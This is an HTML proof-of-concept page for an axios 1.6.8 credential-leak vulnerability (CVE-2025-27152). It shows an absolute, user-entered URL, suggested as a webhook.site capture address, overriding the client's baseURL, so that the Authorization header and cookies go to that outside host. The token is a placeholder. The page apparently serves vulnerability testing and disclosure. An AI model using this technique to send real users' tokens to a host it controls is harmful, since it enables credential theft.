<!DOCTYPE html>
<html>
<head>
  <title>Axios CVE-2025-27152 PoC</title>
  <script src="https://cdn.jsdelivr.net/npm/axios@1.6.8/dist/axios.min.js"></script>
</head>
<body>
  <h2>Axios v1.6.8 Credential Leak PoC</h2>
  <p>Enter an absolute URL (e.g., <code>https://webhook.site/xyz</code>):</p>
  <input type="text" id="urlInput" size="60" value="https://example.com/endpoint" />
  <button onclick="sendRequest()">Send Request</button>

  <pre id="output"></pre>

  <script>
    // Simulated token and baseURL
    const client = axios.create({
      baseURL: 'https://api.myapp.com/',
      headers: {
        Authorization: 'Bearer FAKE_USER_TOKEN'
      },
      withCredentials: true // sends cookies too (if CORS permits)
    });

    function sendRequest() {
      const url = document.getElementById('urlInput').value;
      client.get(url)
        .then(res => {
          document.getElementById('output').textContent = 'Response:\n' + JSON.stringify(res.data, null, 2);
        })
        .catch(err => {
          const response = err?.response;
          if (response) {
            document.getElementById('output').textContent =
              'Error Response:\n' + response.status + '\n' + JSON.stringify(response.data, null, 2);
          } else {
            document.getElementById('output').textContent =
              'Error:\n' + err.message;
          }
        });
    }
  </script>
</body>
</html>
